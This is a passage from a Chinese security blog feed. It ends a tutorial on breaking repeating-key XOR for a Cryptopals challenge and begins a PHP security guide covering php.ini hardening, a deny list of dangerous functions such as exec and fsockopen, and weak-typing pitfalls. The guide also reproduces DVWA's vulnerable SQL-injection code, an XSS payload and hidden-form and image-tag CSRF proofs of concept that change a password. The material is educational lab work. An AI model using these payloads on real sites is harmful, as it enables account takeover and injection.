3.413793103448276), (31, 3.5935483870967744), (16, 3.7), (18, 3.7111111111111112), (14, 3.742857142857143), (15, 3.7466666666666666), (13, 3.753846153846154), (6, 3.7666666666666666), (19, 3.768421052631579), (8, 3.8), (20, 3.82), (37, 3.827027027027027), (39, 3.8666666666666667), (11, 3.8727272727272726), (33, 3.8727272727272726), (26, 3.8923076923076922), (12, 3.9), (17, 3.9176470588235293), (30, 3.92), (34, 3.9352941176470586), (22, 3.9454545454545453), (28, 3.95), (32, 3.95), (7, 3.9714285714285715), (27, 3.977777777777778), (21, 3.9904761904761905), (35, 3.994285714285714), (38, 4.021052631578947), (25, 4.024), (24, 4.033333333333333), (9, 4.044444444444444), (23, 4.069565217391304), (10, 4.1), (36, 4.188888888888889), (4, 4.2)][Finished in 0.1s] 可以看到，正确的密钥长度29排得比较靠前。这样我们从前往后取作为密钥长度来进行后面的密钥的猜解就可以大大增加我们的效率，相对于暴力遍历来说。这点在后面可以进一步看到。 根据猜出的密钥长度进行密文的解密在密文的解密部分，根据笔者的总结，发现有两种行之有效的办法。 methon one（合理利用明文的空格）:这种方法其实是利用了一个抑或的规律和一个小技巧。使用到的抑或定律其实相当的简单：在使用异或加密的形式下，使用相同密钥加密的明文和秘文间存在这个规律，密文和密文异或等于明文和明文异或。可以通过简单的数学公式加以证明，这里就不展开叙述。另一个小技巧就是：空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母。为了证明这个小技巧，可以使用一个python脚本来遍历输出。 1234results = []value = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;for asc1 in value: print(asc1,&quot;^0x20----&gt;&quot;,chr(ord(asc1)^0x20)) 这样当两个密文按照字节异或后的结果处于字母表的ascii值之间，我们就可以有很大的概率认为异或的明文字符之一是空格，那么根据这个规律，我们可以依次遍历出密钥的每个字节，当捕获的密文组足够多，我们就可以有相当大的概率解出整个密钥，因为当密文组够多，我们有很大的概率得到每个密钥对应异或的字节位上的明文为空格，然后依次异或出密钥。 当然读者可能会问，ascii码那么多，两两异或的结果处于字母区间的可能情况不是有很多种吗？这样说是一点没错的，我曾经尝试写过一个常用英文符号两两异或的脚本，遍历输出非空格下，两者异或的结果是字母表区间的python脚本，如下：12345678910111213141516171819results = []verifycode = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;value = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\,\/\.\&quot;\&apos;\?\!\ \:&apos;for asc1 in value: for asc2 in value: result = ord(asc1) ^ ord(asc2) if chr(result) in verifycode and asc1 != &apos; &apos; and asc2 != &apos; &apos;: results.append((asc1, asc2))filtedresult = []setresult = set(results)for i in setresult: for j in setresult: if set(i) != set(j) and set(i) not in filtedresult: filtedresult.append(set(i))print(&quot;verify len:&quot;, len(filtedresult))print(&quot;result:&quot;, filtedresult) 运行这个脚本，会发现有349种可能的情况，那么是不是说明运用空格这个点来破解不合理？其实不然，要知道，这349中可能性里面，没有哪一个字符可以满足与任何一个字母异或都是字母区间，这就是说，空格及有无可挑剔的最大可能。这样一来，我们可以分别按照密钥将密文重新分组，将异或用一个密钥字节的密文合并成一组，这样一来我们就可以拥有密钥长度个组，每个组都是明文异或同一个密钥字节得来的密文。取其中一个分组，将里面的字符两两异或，记录每个字符与其他每一个字符异或出现结果是字母的次数，取最大次数（因为根据概率学，明文空格情况下，该次数应该是最大的，当然不排除极小概率的特俗情况）的字符我们将推断其明文为空格，然后异或出该分组的密钥字节。说来可能有点绕，做出相应的图示如下： 以下是具体的实现的步骤：12341. 使用取模运算把密文分成n个分组（其中n是密钥长度），如此以来，我们就有了n个独立的凯撒加密式的密文组（因为每个分组里面的值是使用同一个密钥字节明文异或）。这样就把问题简化成了破解n个独立的凯撒加密模式的单字节抑或密码方式。这一步可以直接使用爆破，但是效率不高。我们采取另一种姿势。2. 将2中的每个分组做如下的操作：每个分组做嵌套循环，内循环，外循环。设置外循环计数值possible_space=0，max_possible=0，设置内循环计数值maxpossible=0,依次取出每个分组中的每一个字节做与其他字节两两抑或进行内循环，如果结果是字母，我们就把内循环计数值maxpossible+1,在每个内循环结束后进行max_possible的更新（与内循环maxpossible做对比），并记录当前字节的位置到possible_space，然后外循环继续。直至遍历完所有的字节。取出max_possible对应的字节位置possible_space处的字节码，我们把它对应的明文假设成空格（根据之前的讨论）然后将该位置的字节和0x20（空格）异或;找出相应位置的密钥字节。3. 重复2中的步骤，依次根据每个分组找出每位的密钥字节，至此密钥破解完毕4. 将找出的密钥用于破解密文。当密文足够多，可以发现破解的准确率很高，基本可以做到无差别破解。 可能读者对上述步骤仍旧存在一些疑问，这里以例题作为进一步的说明（crypto chanllege set1 question6），下面是解题代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445def break_single_key_xor(text): key = 0 possible_space=0 max_possible=0 letters = string.ascii_letters.encode(&apos;ascii&apos;) for a in range(0, len(text)): maxpossible = 0 for b in range(0, len(text)): if(a == b): continue c = text[a] ^ text[b] if c not in letters and c != 0: continue maxpossible += 1 if maxpossible&gt;max_possible: max_possible=maxpossible possible_space=a key = text[possible_space]^ 0x20 return chr(key)text = &apos;&apos;with open(&quot;6.txt&quot;,&quot;r&quot;) as f: for line in f: text += line b = base64.b64decode(text)for KEYSIZE in range(2, 40): # KEYSIZE=29 block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = &apos;&apos; try: for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), &quot;utf-8&quot;) plaintext = bxor(b, key) print(&quot;keysize:&quot;, KEYSIZE) print(&quot;key is:&quot;, keys, &quot;\n&quot;) s = bytes.decode(plaintext) print(s) except Exception: continue 在之前的讲述上，理解这段代码并不难，读者试着输出所有可能的结果，我们可以看到有40种不同的结果，当密钥长度爆破到29的时候，明文清晰可见。但是这里是采用爆破的方式猜解密钥长度，不是很智能。当我们使用之前汉明距离猜解密钥长度的方法，可以更加快速的得出结果，以下是改进版： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import base64import stringdef bxor(a, b): # xor two byte strings of different lengths if len(a) &gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])])def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(&quot;1&quot;) return differing_bitsdef break_single_key_xor(text): key = 0 possible_space=0 max_possible=0 letters = string.ascii_letters.encode(&apos;ascii&apos;) for a in range(0, len(text)): maxpossible = 0 for b in range(0, len(text)): if(a == b): continue c = text[a] ^ text[b] if c not in letters and c != 0: continue maxpossible += 1 if maxpossible&gt;max_possible: max_possible=maxpossible possible_space=a key = text[possible_space]^ 0x20 return chr(key)text = &apos;&apos;with open(&quot;6.txt&quot;,&quot;r&quot;) as f: for line in f: text += lineb = base64.b64decode(text)normalized_distances = []for KEYSIZE in range(2, 40): #我们取其中前6段计算平局汉明距离 b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) )normalized_distances = sorted(normalized_distances,key=lambda x:x[1])for KEYSIZE,_ in normalized_distances[:5]: block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = &apos;&apos; try: for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), &quot;utf-8&quot;) plaintext = bxor(b, key) print(&quot;keysize:&quot;, KEYSIZE) print(&quot;key is:&quot;, keys, &quot;\n&quot;) s = bytes.decode(plaintext) print(s) except Exception: continue 改进后我们可以更加快速的破解出明文，而且最后的人工搜索阶段也会减少很多的对比，十分友好。 methon two:当然除了利用空格来猜测密钥这种方法以外，我们还有另外一种比较大众化的思路，那就是是利用了字母出现的平频率统计规律进行权重赋值。其实说白了就是字频攻击。在methon one中的第一部以后，我们就有了一组组类似凯撒加密的密文，只不过他们组不成完整的词或句子，如果我们单单暴力遍历256种密钥可能，那么结果我们也缺少一个衡量的指标，别说256中可能够你看的，而且没有一种是成词成句的。所以这样解出密钥很费力。我们需要一个评判的指标实现高可用和高效性。这时词频攻击的优势就体现出来了。我们可以给英文中的字母根据百分比附一个权重，然后依次计算256组解密后的“明文”总权重，当总权值最高时，我们有理由相信这时的密钥字节是正确的。因为当截获的密文足够多，我们可以得到分布十分贴近字频规律的明文，这样算出来的总权值就越大。关于字频的统计特性，我们可以在网上搜到很多权重赋值版本。以下是对the cryptopals crypto challenges question6的样例：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122import base64import stringdef bxor(a, b): # xor two byte strings of different lengths if len(a) &gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])])def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(&quot;1&quot;) return differing_bitsdef score(s): freq = &#123;&#125; freq[&apos; &apos;] = 700000000 freq[&apos;e&apos;] = 390395169 freq[&apos;t&apos;] = 282039486 freq[&apos;a&apos;] = 248362256 freq[&apos;o&apos;] = 235661502 freq[&apos;i&apos;] = 214822972 freq[&apos;n&apos;] = 214319386 freq[&apos;s&apos;] = 196844692 freq[&apos;h&apos;] = 193607737 freq[&apos;r&apos;] = 184990759 freq[&apos;d&apos;] = 134044565 freq[&apos;l&apos;] = 125951672 freq[&apos;u&apos;] = 88219598 freq[&apos;c&apos;] = 79962026 freq[&apos;m&apos;] = 79502870 freq[&apos;f&apos;] = 72967175 freq[&apos;w&apos;] = 69069021 freq[&apos;g&apos;] = 61549736 freq[&apos;y&apos;] = 59010696 freq[&apos;p&apos;] = 55746578 freq[&apos;b&apos;] = 47673928 freq[&apos;v&apos;] = 30476191 freq[&apos;k&apos;] = 22969448 freq[&apos;x&apos;] = 5574077 freq[&apos;j&apos;] = 4507165 freq[&apos;q&apos;] = 3649838 freq[&apos;z&apos;] = 2456495 score = 0 string=bytes.decode(s) for c in string.lower(): if c in freq: score += freq[c] return scoredef break_single_key_xor(b1): max_score = 0 english_plaintext = 0 key = 0 for i in range(0,256): b2 = [i] * len(b1) try: plaintext = bxor(b1, b2) pscore = score(plaintext) except Exception: continue if pscore &gt; max_score or not max_score: max_score = pscore english_plaintext = plaintext key = chr(i) return keytext = &apos;&apos;with open(r&quot;c:/Users/lyy18291855970/Desktop/密码学/密码题/the cryptopals crypto challenges/6.txt&quot;, &quot;r&quot;) as f: for line in f: text += lineb = base64.b64decode(text)normalized_distances = []for KEYSIZE in range(2, 40): # 我们取其中前6段计算平局汉明距离 b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] b7 = b[KEYSIZE * 6: KEYSIZE * 7] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) )normalized_distances = sorted(normalized_distances, key=lambda x: x[1])for KEYSIZE, _ in normalized_distances[:5]: block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = &apos;&apos; for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), &quot;utf-8&quot;) plaintext = bxor(b, key) print(&quot;keysize:&quot;, KEYSIZE) print(&quot;key is:&quot;, keys, &quot;\n&quot;) s = bytes.decode(plaintext) print(s) 反思回顾通过这一番折腾，对流密码的重用的不安全性有了更加深入的理解，同时也是对ctf密码题这类异或题型的解题思路的一次总结升华。在文章的最后想把这篇文章里用到的几个不错的思路或者说想法做一个总结性摘录： 12341. 在异或加密中，明文和明文异或等于密文和密文异或，并且二者的汉明距离一样。2. 空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母。除了空格以外，仍旧有一些组合可以出现异或结果是大小写字母，但是空格出现时，结果在大小写字母间的概率最大。3. 两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3（每比特），任意字符（非纯字母）的两两汉明距离平均为4。4. 在破解这类问题的三步走：猜解密钥长度；根据密钥长度分组，依次求解密钥每个字节得出密钥；最后根据密钥还原出明文。 参考文献https://crypto.stackexchange.com/questions/8115/repeating-key-xor-and-hamming-distancehttps://cypher.codes/writing/cryptopals-challenge-set-1]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>cryptography</tag>
        <tag>流密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈php安全]]></title>
    <url>%2F2018%2F09%2F05%2F%E6%B5%85%E8%B0%88php%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[php天生支持web应用的开发，以其简单易学，开发效率高而备受喜爱。使其占据了大片的市场。但是php本身的安全问题却一直备受诟病，以及编写不规范的php程序，使得web应用漏洞百出，这篇文章从配置文件和代码编写等角度总结前人的经验以及自己的感悟体会，但是不会十分细致的讲解每个漏洞的具体原理，也不会过多的涉及php语法讲解（除了部分关键函数），所以最好能够有一定php基础和对OWASP top10有所了解，最后向前辈致敬。 请充分了解你的php基本信息12345678# 注意到以下的文件结构在新版本php或者不同的发行版中略有不同，就好比在ubuntu18.04中安装php7就和下面的文件结构有较大的差别，所以下面的文件仅仅作为一个apache的架构参考。Root：/var/www/html默认Web服务：Apache（可以使用Lighttpd或Nginx代替）默认PHP配置文件：/etc/php.ini默认PHP Extensions配置目录：/etc/php.d/PHP安全配置样例文件：/etc/php.d/security.ini（需要使用文本编辑器创建这个文件）php 版本： php -v查看当前PHP所编译 ： php -m 敏感配置 以下是一些常见的配置举例，更多请查看：http://php.net/manual/zh/ini.core.php#ini.variables-order 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 不在请求头中泄露php信息expose_php=Off # 不回显php错误（包括运行错误时和启动时错误），但是进行错误记录play_errors=Off display_startup_errors=offlog_errors=Onerror_log=/var/log/httpd/php_scripts_error.log# 文件上传开启与否和最大上传文件限制file_uploads=Onupload_max_filesize=1M# 控制最大post数据post_max_size=1M #注意到要比upload_max_filesize大，否则后者失效# 关闭远程代码执行allow_url_fopen=Offallow_url_include=Off# 关闭全局注册变量，不过默认5.x版本的php是offregister_globals=off# 关于安全模式和粗暴的魔术引号过滤，注意到save_mode模式在php5.3以上版本，safe_mode被弃用，在php5.4以上版本，则将此特性完全去除了。safe_mode=Onsafe_mode_include_dir = D:/phpstudy/www/include/magic_quotes_gpc=Off #如果开启了这个，然后在php应用中使用addslashes()过滤输入会造成双重转义，使得过滤无济于事，遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。magic_quotes_runtime# 资源管理防止过分消耗服务器资源max_execution_time = 30max_input_time = 30memory_limit = 40M# 禁用危险函数disable_functions = phpinfo,eval,passthru,assert,exec,system,ini_set,ini_get,get_included_files,get_defined_functions,get_defined_constants,get_defined_vars,glob,``,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen# 限制php访问文件系统open_basedir=&apos;/var/www/html/&apos;;......;......# session保存路径session.save_path=&quot;/var/lib/php/session&quot;# 上传文件默认路径upload_tmp_dir=&quot;/var/lib/php/upload&quot; 关于危险函数1234567891011# 特殊符号``:反引号运算符在激活了安全模式或者关闭了 shell_exec() 时是无效的，同时与其它某些语言不同，反引号不能在双引号字符串中使用。。否则将会当作shell命令执行，执行效果等同于shell_exec()。# 文件操作http://php.net/manual/zh/ref.filesystem.php# 全局信息，配置等http://php.net/manual/zh/ref.info.php# 程序执行http://php.net/manual/zh/book.exec.php 不要过分相信php弱类型前人之叙述比较完备，在这就不赘余，仅仅做个汇总。同样还可以参看官网给出的类型表PHP 类型比较表123456789101112131415161718192021222324252627282930313233343536373839400==&apos;0&apos; //true0 == &apos;abcdefg&apos; //true1 == &apos;1abcdef&apos; //truenull==false //true123==&apos;123&apos; //true //哈希比较&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true&quot;0e123456abc&quot;==&quot;0e1dddada&quot; //false&quot;0e1abc&quot;==&quot;0&quot; //true&quot;0x1e240&quot;==&quot;123456&quot; //true&quot;0x1e240&quot;==123456 //truevar_dump(intval(&apos;2&apos;)) //2var_dump(intval(&apos;3abcd&apos;)) //3var_dump(intval(&apos;abcd&apos;)) //0//任意两个array,MD5相等var_dump(md5($array1)==var_dump($array2)); //true//case 自转换，以下代码输出i is less than 3 but not negative$i =&quot;2abc&quot;;switch ($i) &#123;case 0:case 1:case 2: echo &quot;i is less than 3 but not negative&quot;; break;case 3: echo &quot;i is 3&quot;;&#125;//in_array的缺陷，array_search$array=[0,1,2,&apos;3&apos;];var_dump(in_array(&apos;abc&apos;, $array)); //truevar_dump(in_array(&apos;1bc&apos;, $array)); //true//strcmp在php5.x个版本后有些特性不太同，所以遇到的时候具体讨论 全局注册变量如果已经弃用的 register_globals 指令被设置为 on 那么局部变量也将在脚本的全局作用域中可用。例如， $_POST[‘foo’] 也将以 $foo 的形式存在。这将会造成一些变量覆盖，条件判断绕过。以下是简化的全局变量认证绕过模型1234567if(authenticated_user())&#123; $authorized=true;&#125;if($authorized)&#123; do something......&#125; 对于以上的绕过，我们可以有以下的规避措施：(1) php.ini register_globals=off(2) 在每次判断前初始化变量，如下：123456789$authorized=false;if(authenticated_user())&#123; $authorized=true;&#125;if($authorized)&#123; do something......&#125; 一些常出现的“安全”函数strip_tags该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。但是记住光光去除标签，但是不去除属性，那么在一些可以引入js的代码的属性标签里仍旧会造成xss。具体查看参照 htmlspecialchars这个函数多用来对xss的过滤上，但是注意到这个函数对\和&#39;是不敏感的，本身不会处理,要想转义&#39;需要加入ENT_QUOTES参数，否则仍有可能会出现xss。举例如下：12345&lt;?php$name = $_GET["name"];$name = htmlspecialchars($name);?&gt;&lt;input type='text' value='&lt;?php echo $name?&gt;;'&gt; poc=?name=&#39;onmouseover=&#39;alert(1)，则在鼠标悬停在输入框上的时候会触发xss，笔者测试的时候IE可以弹窗，而chrome的xss过滤器直接把这个xss语句识别出了，拒绝访问。但是可以看出在绕过浏览器xss filter的情况下仍旧会导致xss。 htmlentitiesescapeshellarg将用户输入进行单引号包含，使其成为真正的字符串，而不会造成执行任意命令的不可控情况。 escaoeshellcmd反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 is_uploaded_file该函数用来检查文件是否正真的由用户传的，避免对非用户传的文件进行操作，从而泄露本地信息。 intval将输入转换成整数，有时被用来抵抗sqli。 fgetss这个函数可以从文件操作符中取出一行并且过滤掉html标签 quotemetastripslashesstr_replacestr_replace函数是极其不安全的，因为很多时候可以使用双写绕过替换规则 php内置协议(伪协议)以下伪协议在很多绕过场景下发挥着举足轻重的作用，如后面提到的文件包含file://协议绕过，以及最近才提出的phar协议对象注入，我们可以在不存在可控unserialization（）函数的情况下利用phar反序列化对象，实现对象注入。1234567891011121314file:///var/www/html 访问本地文件系统ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问FTP(s) URLsdata:// 数据流http:// — 访问 HTTP(s) URLsftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流zlib:// — 压缩流data:// — Data (RFC 2397)glob:// — 查找匹配的文件路径模式phar:// — PHP Archivessh2:// — Secure Shell 2rar:// — RARogg:// — Audio streamsexpect:// — 处理交互式的流 向DVWA学习php安全的代码编写 以下样例来自于DVWA v1.9版本 sql注入 Low level 1234567891011121314151617181920212223242526272829&lt;?php if( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Get values $first = mysql_result( $result, $i, "first_name" ); $last = mysql_result( $result, $i, "last_name" ); // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; // Increase loop count $i++; &#125; mysql_close(); &#125; ?&gt; 在这个例子中，是最low安全等级的php代码编写样例，可以看到，代码中并没有对用户输入的id变量进行检查和过滤，同时使用的是$_REQUEST全局数组的方式，如果不是特别需要，我们编程的时候尽量不要使用$_REQUEST获取用户的参数，因为$_REQUEST的参数比较杂，包括$_GET,$_POST，$_COOKIE等超全局变量，并且二者还存在变量获取顺序的不一致，受配置文件中variables_order的约定，在存在waf的环境下，容易造成绕过，具体可以参看之前写的文章——CTF（第三条tips）。未经处理的用户输入直接与sql语句拼接交互，造成sql注入漏洞，十分危险。 Medium level123456789101112131415161718192021222324252627282930&lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysql_real_escape_string( $id ); // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Display values $first = mysql_result( $result, $i, "first_name" ); $last = mysql_result( $result, $i, "last_name" ); // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; // Increase loop count $i++; &#125; //mysql_close(); &#125; ?&gt; 这个版本的代码，与之前的相比只是多了个mysql_real_escape_string函数的过滤，但是要知道这里的$id在sql语句中是数字类型，这样mysql_real_escape_string的转义就会形同虚设，注入仍旧是一马平川。当然不恰当的字符编码，可能会造成宽字节注入，详细可以看之前的文章——sql注入捣鼓 High leval1234567891011121314151617181920212223242526272829&lt;?php if( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; $result = mysql_query( $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Get values $first = mysql_result( $result, $i, "first_name" ); $last = mysql_result( $result, $i, "last_name" ); // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; // Increase loop count $i++; &#125; mysql_close(); &#125; ?&gt; 在高级版本中只是把注入点隐匿在了$_SESSION全局变量里面,而session中的id值的注册是通过用户输入$_POST全局变量传入，所以是完全可控的，这样一来，就和之前的注入没有什么不一样。这段代码是要提醒我们对于session，只要注册值是用户可控的，也是可能存在sql注入的风险的。另外需要注意到的是，在这个High级别的注入中，回显和传参页面不是同一个，是一个二阶注入，如果使用工具注入，如sqlmap，别忘了加上自定义回显--second-order参数。 Impossible level123456789101112131415161718192021222324252627282930313233&lt;?php if( isset( $_GET[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 根据DVWA的说法，这样写出来的应用，是不存在sql注入的。也即这是个十分安全的php代码编写规范。why?首先，我们可以看到它使用Anti-CSRF token的方法来避免csrf攻击（具体细节会在下文csrf防御谈到），然后在sql语句的编写中，使用的是预处理语句，所谓的预处理就是通过php的pdo预处理机制PDO::prepare，先往数据库送出语句模板，进行解析,编译，然后第二次向数据库传入查询参数，在第二次的查询过程中可以理解为不再进行语义解析，所以即使传入sql语句，也会因为不进行语义解析而失效。所以这是一种比较推荐的数据库交互sql语句编写规范。现在很多主流的数据库已经支持预处理，即使不支持，PHP的PDO也会进行预处理模拟实现，这样对于程序员接口一致，不需了解不同数据库对预处理支持的方式差异。 更多PDO细节可以参考官网：http://php.net/manual/zh/pdo.prepared-statements.php。 参数bind的细节可以查看：http://php.net/manual/zh/pdo.constants.php。 CSRF(完整的攻击过程，可以看这篇前辈的文章：http://www.freebuf.com/articles/web/118352.html) Low level 1234567891011121314151617181920212223242526272829&lt;?php if( isset( $_GET[ 'Change' ] ) ) &#123; // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Feedback for the user echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;"; &#125; else &#123; // Issue with passwords matching echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"; &#125; mysql_close(); &#125; ?&gt; 所谓的CSRF（Cross-site request forgery）直白的翻译就是跨站点请求伪造。说人话就是攻击者通过诱使victim访问其精心构造的url或者访问其精心构造的页面，来使得攻击者可以以victim的身份做诸如发邮件，发消息，改密码等骚操作。在DVWA这个系列里面，模拟的是修改密码的界面。先来看下low等级的代码，可以说是没有进行仍和的再认证，试下为啥是“再认证”？其实我们在访问到这个修改密码界面的时候，已经登陆过一次，服务器会在每次访问时检查session。所以这是第一道认证。但是这种会话级别的认证对csrf是没有抵抗力的。具体的过程可以参看之前提到的链接。我们可以直接构造url1http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change# 让victim访问，或者使用更加隐匿的 12345&lt;style&gt; form&#123; display:none; &#125;&lt;/style&gt; 构造无迹表单,结合js发送请求，或者1&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; 来实现欺骗隐匿行踪，达到修改密码的目的。顺便盗用两个别人的poc方便展示： (1) 图片形式诱导12345&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt; (2) 隐藏表单的形式 1234567891011121314151617181920 &lt;body onload=&quot;javascript:csrf()&quot;&gt; &lt;script&gt; function csrf()&#123; document.getElementById(&quot;button&quot;).click(); &#125; &lt;/script&gt; &lt;style&gt; form&#123; display:none; &#125; &lt;/style&gt; &lt;form action=&quot;http://www.dvwa.com/vulnerabilities/csrf/?&quot; method=&quot;GET&quot;&gt; New password:&lt;br /&gt; &lt;input type=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot; name=&quot;password_new&quot; value=&quot;test&quot;&gt;&lt;br /&gt; Confirm new password:&lt;br /&gt; &lt;input type=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot; name=&quot;password_conf&quot; value=&quot;test&quot;&gt;&lt;br /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; id=&quot;button&quot; name=&quot;Change&quot; value=&quot;Change&quot; /&gt; &lt;/form&gt;&lt;/body&gt; Medium level123456789101112131415161718192021222324252627282930313233343536&lt;?php if( isset( $_GET[ 'Change' ] ) ) &#123; // Checks to see where the request came from if( eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] ) ) &#123; // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = 